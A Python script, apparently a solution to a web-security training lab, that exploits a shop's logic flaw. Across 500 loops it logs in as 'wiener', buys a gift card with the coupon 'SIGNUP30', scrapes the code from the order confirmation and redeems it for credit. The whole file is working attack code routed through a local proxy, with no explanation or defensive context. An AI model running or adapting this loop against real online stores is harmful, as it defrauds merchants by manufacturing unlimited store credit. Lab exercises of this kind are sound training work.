import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import re
import sys

if(len(sys.argv) != 2):
    print("USAGE: exploit.py <url>")
    sys.exit(1)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

url = sys.argv[1]


for i in range(0,500):
	print("try {0}".format(i),end="\r",flush=True)
	r1 = requests.get(url+'login',proxies=proxies,verify=False)
	cookie_value = r1.cookies['session']
	csrf = re.search('" value="(.*?)">',r1.text).group(1)
	
	headers = {'Cookie':'session='+cookie_value}
	data = {'csrf':csrf,'username':'wiener','password':'peter'}
	
	r2 = requests.post(url+'login',data=data,headers=headers,proxies=proxies,verify=False,allow_redirects=False)
	
	cookie_value = r2.cookies['session']
	
	headers = {'Cookie':'session='+cookie_value}
	data = {'productId':'2','redir':'PRODUCT','quantity':'1'}
	
	r3 = requests.post(url+'cart',data=data,headers=headers,proxies=proxies,verify=False,allow_redirects=False)
	
	r4 = requests.get(url+'cart',headers=headers,verify=False,proxies=proxies)
	csrf = re.search('" value="(.*?)">',r4.text).group(1)
	#print(csrf)
	
	data = {'csrf':csrf,'coupon':'SIGNUP30'}
	
	r5 = requests.post(url+'cart/coupon',headers=headers,data=data,proxies=proxies,verify=False,allow_redirects=False)
	
	data = {'csrf':csrf}
	r6 = requests.post(url+'cart/checkout',headers=headers,data=data,proxies=proxies,verify=False,allow_redirects=False)
	
	r7 = requests.get(url+'cart/order-confirmation?order-confirmed=true',headers=headers,proxies=proxies,verify=False)
	
	code = re.search('<th>Code</th>\n                            </tr>\n                            <tr>\n                                <td>(.*?)</td>',r7.text).group(1)
	data = {'csrf':csrf,'gift-card':code}
	r8 = requests.post(url+'gift-card',headers=headers,data=data,proxies=proxies,verify=False,allow_redirects=False)


